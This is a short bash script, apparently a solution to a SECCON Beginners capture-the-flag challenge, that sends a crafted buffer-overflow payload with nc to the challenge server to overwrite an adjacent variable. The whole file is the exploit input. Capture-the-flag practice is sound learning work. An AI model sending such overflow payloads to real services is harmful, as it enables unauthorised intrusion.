#!/bin/bash

echo -ne "AAAAAAAAAAAAAAAAB\x00\x00\x00\x00\x00\x00\x00\x01\n" | nc simpleoverflow.beginners.seccon.games 9000

exit 0
